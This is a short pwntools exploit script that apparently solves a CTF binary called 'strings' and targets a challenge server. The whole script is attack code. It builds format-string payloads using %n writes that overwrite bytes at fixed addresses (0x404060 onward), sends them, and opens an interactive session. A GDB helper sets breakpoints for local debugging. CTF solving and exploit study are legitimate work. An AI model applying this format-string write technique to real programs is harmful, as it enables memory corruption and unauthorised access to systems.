#!/usr/bin/python3

from pwn import *

exe = ELF('strings', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main2+97
                b*main+76
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.n00bzunit3d.xyz', 7150)
else:
        p = process(exe.path)
GDB()

# 0x70243825
p.recvline()

# payload= f"%{0x3125}c%10$n%{0x702432-0x3125}c%11$naaa".encode()
payload = f"%{0x25}c%11$n%{0x3231-0x25}c%12$n%{0x7024 - 0x3231}c%13$n".encode()
# payload = f"%{0x7025}c%10$n".encode()
# payload = b""
payload = payload.ljust(40)
payload += p64(0x404060)
payload += p64(0x404061)
payload += p64(0x404063)
sl(payload)
p.interactive()
